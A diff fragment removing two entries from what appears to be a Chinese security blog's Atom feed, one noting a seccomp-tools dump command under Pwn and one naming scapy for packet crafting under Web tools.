-&lt;p&gt;&lt;code&gt;seccomp-tools dump 对应程序&lt;/code&gt;&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
-    
-    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
-    
-    <category term="保护措施" scheme="http://example.com/categories/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>模拟发包</title>
-    <link href="http://example.com/2024/06/03/Web/%E5%B7%A5%E5%85%B7/%E6%A8%A1%E6%8B%9F%E5%8F%91%E5%8C%85/"/>
-    <id>http://example.com/2024/06/03/Web/%E5%B7%A5%E5%85%B7/%E6%A8%A1%E6%8B%9F%E5%8F%91%E5%8C%85/</id>
-    <published>2024-06-03T14:55:17.000Z</published>
-    <updated>2024-07-25T06:08:46.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>scapy</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;scapy&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="http://example.com/categories/Web/"/>
-    
-    <category term="工具" scheme="http://example.com/categories/Web/%E5%B7%A5%E5%85%B7/"/>
     
     
   </entry>
